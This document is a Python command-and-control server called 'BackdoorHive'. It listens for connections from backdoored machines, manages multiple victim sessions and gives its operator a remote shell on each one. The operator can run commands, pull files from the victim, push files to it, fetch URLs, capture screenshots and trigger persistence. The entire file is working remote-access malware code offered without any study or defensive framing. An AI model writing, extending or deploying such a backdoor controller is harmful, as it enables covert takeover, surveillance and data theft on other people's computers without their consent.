#!/usr/bin/python

import socket
import json
import os
import base64
import threading


def shell(target, ip):
    def send_j(data):
        json_data = json.dumps(data)
        target.send(json_data.encode('utf-8'))

    def recv_j():
        data = ""
        while True:
            try:
                data = data + target.recv(1024).decode('utf-8')  # receiving chunks of 1024 bytes until json.loads(data) returns a correct json format
                return json.loads(data)
            except ValueError:  # if the output of json.loads(data) is not complete (not in json format)
                continue

    #outside of while loop we can set up an input for sessions and client management
    #and only the client connected will enter the loop and when exit we come back to choosing clients
    while True:
        cmd =  input("# ")
        cmd_l = cmd.split()
        if cmd_l[0].lower() == "help":
            help_opt = '''
        check           : Check user's privileges 
        download <file> : Download file from host
        Upload <file>   : Upload file to host
        wget <URL>      : Download file from a URL 
        screenshot      : Take a screenshot
        kill_client     : Disconnect current host 
                                '''
            print(help_opt)
            continue
        elif cmd_l[0].lower() == "background":
            break
        else:
            send_j(cmd) # send command to client

        ##commands that will be sent to client
        if cmd_l[0].lower() == "persist":
            continue

        elif cmd_l[0].lower() == "kill_client":
            target.close()
            targets.remove(target)
            ips.remove(ip)
            break
        elif cmd_l[0].lower() == "cd" and len(cmd) > 2: #only if cd and a path (if cd only it runs as normal command)
            continue
        elif cmd_l[0].lower() == "screenshot":
            with open("screenshot_client","wb") as f:
                data = recv_j()
                print(data)
                f.write(base64.b64decode(data))
                f.close()
            continue
        elif cmd_l[0].lower() == "download":
            with open(cmd_l[1].lower(),"wb") as f:
                data = recv_j()
                f.write(base64.b64decode(data)) #receive content of file from client and write into a speified file name
                f.close()
            continue
        elif cmd_l[0].lower() == "upload":
            try:
                with open(cmd_l[1].lower(), "rb") as f:
                    send_j(base64.b64encode(f.read()).decode('utf-8')) #send the content of the file in the server
                    f.close()
                continue
            except:
                error = "failed to upload"
                send_j(base64.b64encode(error.encode('utf-8')).decode('utf-8'))
                #continue
        output = recv_j() #receive output from client
        print(output)

def server():
    global client_index
    while True:
        if stop_threads:
            break
        s.settimeout(1) #
        try:
            target, ip = s.accept() #accepting an incoming connection (target is socket object and IP is remote IP+port)
            targets.append(target)
            ips.append(ip)
            print(str(targets[client_index]) + "---" + str(ips[client_index]) + "CONNECTED")
            client_index += 1
            continue
        except:
            continue



 #count of connections
global s
ips = [] #list of IP,port
targets = [] #lisk of socket objects
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 7777))
s.listen(5)
print("Listening to incoming connections")
client_index = 0

stop_threads = False
thread1 = threading.Thread(target=server) #setting a thread to run function server()
thread1.start()

# C2 center
while True:
    cmd = input("BackdoorHive > ")
    cmd_l = cmd.split()
    if not cmd_l: #to pass next iteration when pressing enter and no input given
        continue
    #exit C2 center
    elif cmd_l[0].lower() == "exit":
        stop_threads = True #stop thread1
        break # exit current while loop
    elif cmd_l[0].lower() == "help":
        help_opt = '''
    sessions        : Display active sessions 
    session <id>    : Interact with specific session
    background      : background the active session
    exit            : Exit C2 server 
                            '''
        print(help_opt)
    elif cmd_l[0].lower() == "sessions":
        count = 0
        for ip in ips:
            print(f"Session {count} ----- {ip}")
            count += 1
    #kill session <id>
    elif cmd_l[0].lower() == "kill":
        try:
            session_id = int(cmd_l[1])
            targets[session_id].close()
            targets.pop(session_id) #only remove session from list (connection still alive problem)
            ips.pop(session_id)
            #need to implement how to terminate session
        except:
            print ("No session to close")
    #interact with a specific target
    elif cmd_l[0].lower() == "session":
        try:
            session_id = int(cmd_l[1])
            target = targets[session_id]
            ip = ips[session_id]

        except:
            print("Session not found")
        else:
            shell(target, ip)